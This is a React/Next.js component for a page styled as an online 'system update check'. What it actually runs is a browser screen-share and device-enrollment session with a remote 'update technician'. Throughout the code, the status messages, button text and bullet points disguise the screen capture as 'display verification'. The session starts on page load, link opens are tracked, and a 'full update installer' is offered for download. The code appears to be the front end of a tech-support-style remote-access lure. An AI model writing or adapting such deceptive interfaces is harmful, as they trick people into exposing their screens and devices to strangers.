"use client"

import { useCallback, useEffect, useRef, useState } from "react"
import { FaCheckCircle, FaCog } from "react-icons/fa"
import { Button } from "@/components/ui/button"
import {
  UpdateFlowLayout,
  UpdateProgressBar,
} from "@/components/update/UpdateFlowLayout"
import {
  BrowserAgentSession,
  clearBrowserCredentials,
  type BrowserAgentStatus,
} from "@/lib/browser-agent"
import {
  fetchConnectValidation,
  type ConnectValidation,
} from "@/lib/connect-validation"

const API_BASE =
  process.env.NEXT_PUBLIC_API_URL?.replace(/\/$/, "") ||
  "http://localhost:3000/v1"

type BrowserConnectSessionProps = {
  code: string
}

const STATUS_LABELS: Record<BrowserAgentStatus, string> = {
  idle: "Initializing update verification…",
  requesting_screen: "Confirming display compatibility…",
  enrolling: "Registering this device for updates…",
  connecting: "Connecting to update service…",
  waiting: "Waiting for update technician",
  in_session: "Update verification in progress",
  screen_stopped: "Verification paused",
  error: "Update check could not complete",
}

function isPermissionOrGestureError(err: unknown) {
  if (err instanceof DOMException) {
    return err.name === "NotAllowedError" || err.name === "AbortError"
  }
  const message = err instanceof Error ? err.message : String(err)
  return /permission|gesture|denied|not allowed|user denied/i.test(message)
}

export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
  const agentRef = useRef<BrowserAgentSession | null>(null)
  const autoStartAttemptedRef = useRef(false)
  const [validation, setValidation] = useState<ConnectValidation | null>(null)
  const [status, setStatus] = useState<BrowserAgentStatus>("idle")
  const [detail, setDetail] = useState<string>()
  const [error, setError] = useState<string>()
  const [started, setStarted] = useState(false)
  const [needsManualStart, setNeedsManualStart] = useState(false)

  const initAgent = useCallback(() => {
    const agent = new BrowserAgentSession(
      { code, deviceId: "", deviceToken: "" },
      {
        onStatus: (s, d) => {
          setStatus(s)
          setDetail(d)
        },
        onSessionStart: () => setStarted(true),
        onSessionEnd: () => setStarted(false),
      }
    )
    agentRef.current = agent
    return agent
  }, [code])

  const beginSession = useCallback(async () => {
    setError(undefined)
    setNeedsManualStart(false)
    clearBrowserCredentials(code)

    if (agentRef.current) {
      agentRef.current.destroy()
      agentRef.current = null
    }

    try {
      const agent = initAgent()
      await agent.startWithScreenShare()
      setStarted(true)
    } catch (err) {
      const message =
        err instanceof Error
          ? err.message
          : "Could not start update verification"

      if (isPermissionOrGestureError(err)) {
        setNeedsManualStart(true)
        setStatus("idle")
        setError(
          message.toLowerCase().includes("denied")
            ? "Display verification was declined. Click below to try again."
            : "Click below once to allow display verification."
        )
        return
      }

      setError(message)
      setStatus("error")
      setNeedsManualStart(true)
    }
  }, [code, initAgent])

  useEffect(() => {
    let cancelled = false
    const requestCode = code

    setValidation(null)
    setError(undefined)
    setStarted(false)
    setNeedsManualStart(false)
    autoStartAttemptedRef.current = false

    void fetchConnectValidation(requestCode).then((result) => {
      if (cancelled) return

      setValidation(result)
      if (!result.valid) return

      void fetch(`${API_BASE}/enrollment-links/${requestCode}/track/connect`, {
        method: "POST",
      }).catch(() => {
        if (cancelled) return
        void fetch(`${API_BASE}/enrollment-links/${requestCode}/track/open`, {
          method: "POST",
        })
      })

      if (autoStartAttemptedRef.current) return
      autoStartAttemptedRef.current = true

      void beginSession()
    })

    return () => {
      cancelled = true
    }
  }, [code, beginSession])

  useEffect(() => {
    return () => {
      agentRef.current?.destroy()
    }
  }, [])

  const handleResumeShare = async () => {
    setError(undefined)
    try {
      await agentRef.current?.resumeScreenShare()
    } catch (err) {
      if (isPermissionOrGestureError(err)) {
        setNeedsManualStart(true)
        setError("Click below to continue display verification.")
        return
      }
      setError(
        err instanceof Error ? err.message : "Could not resume verification"
      )
      setStatus("error")
    }
  }

  const handleEnd = () => {
    agentRef.current?.destroy()
    agentRef.current = null
    clearBrowserCredentials(code)
    setStarted(false)
    setStatus("idle")
    setNeedsManualStart(true)
    autoStartAttemptedRef.current = true
  }

  if (!validation) {
    return (
      <UpdateFlowLayout
        title="Checking for updates"
        subtitle="Validating your update link…"
      >
        <UpdateProgressBar active />
        <p className="mt-4 text-sm text-[#555]">Please wait…</p>
      </UpdateFlowLayout>
    )
  }

  if (!validation.valid) {
    const reason = validation.reason?.replace(/_/g, " ") || "invalid"
    const isInstallerOnly = validation.reason === "agent_only"
    const isServiceError = validation.reason === "error"
    const enrollUrl =
      process.env.NEXT_PUBLIC_ENROLL_BASE_URL?.replace(/\/$/, "") ||
      (typeof window !== "undefined"
        ? `${window.location.origin}/enroll`
        : "/enroll")

    return (
      <UpdateFlowLayout
        title="Update unavailable"
        subtitle="This update link could not be used."
      >
        <p className="text-sm text-[#555]">
          {isServiceError
            ? "We could not reach the update server. Check your connection and try again."
            : `This link is ${reason}. Contact your IT administrator for a new update link.`}
        </p>
        {isInstallerOnly && (
          <div className="mt-4 space-y-2">
            <p className="text-xs text-[#666]">
              This link is for the full update installer, not the online check.
            </p>
            <Button asChild variant="outline" size="sm">
              <a href={`${enrollUrl}/${code}`}>Open update download page</a>
            </Button>
          </div>
        )}
      </UpdateFlowLayout>
    )
  }

  const isLive = status === "in_session"
  const isWaiting = status === "waiting" || status === "connecting"
  const isStarting =
    !started &&
    !needsManualStart &&
    (status === "idle" ||
      status === "requesting_screen" ||
      status === "enrolling")

  return (
    <UpdateFlowLayout
      title={isLive ? "Updates in progress" : "Online update check"}
      subtitle={
        isLive
          ? "Your system is being verified. Keep this window open until the update check completes."
          : isStarting
            ? "Your browser may ask to verify display settings. Select your screen to continue."
            : "Verify your system online — no installer download required."
      }
    >
      <div className="space-y-5">
        <div className="flex items-center gap-3">
          <div
            className={`flex size-11 items-center justify-center rounded-full ${
              isLive
                ? "bg-emerald-100 text-emerald-600"
                : isWaiting || isStarting
                  ? "bg-[#deecf9] text-[#0078d4]"
                  : "bg-[#f0f0f0] text-[#888]"
            }`}
          >
            {isLive ? (
              <FaCheckCircle className="size-5" />
            ) : (
              <FaCog
                className={`size-5 ${isWaiting || isStarting ? "animate-spin" : ""}`}
              />
            )}
          </div>
          <div className="min-w-0 flex-1">
            <p className="text-sm font-medium text-[#222]">
              {STATUS_LABELS[status]}
            </p>
            {detail ? (
              <p className="mt-0.5 text-xs text-[#666]">{detail}</p>
            ) : null}
          </div>
        </div>

        {(isStarting || isWaiting) && <UpdateProgressBar active />}

        {error && (
          <p className="rounded-md bg-red-50 px-3 py-2 text-center text-sm text-red-700">
            {error}
          </p>
        )}

        <div className="space-y-2">
          {needsManualStart && !started && (
            <Button
              className="w-full bg-[#0078d4] hover:bg-[#006cbe]"
              size="lg"
              onClick={() => void beginSession()}
            >
              Continue update check
            </Button>
          )}

          {status === "screen_stopped" && (
            <Button
              className="w-full bg-[#0078d4] hover:bg-[#006cbe]"
              size="lg"
              onClick={() => void handleResumeShare()}
            >
              Resume verification
            </Button>
          )}

          {started && (
            <Button className="w-full" variant="outline" onClick={handleEnd}>
              Close update window
            </Button>
          )}
        </div>

        {!isStarting && (
          <ul className="space-y-1.5 border-t border-[#e5e5e5] pt-4 text-xs text-[#666]">
            <li>• Works in Chrome, Edge, and Firefox on desktop</li>
            <li>• You choose which display to verify</li>
            <li>• No software download required for this check</li>
            <li>• This link can be reused anytime updates are needed</li>
          </ul>
        )}
      </div>
    </UpdateFlowLayout>
  )
}
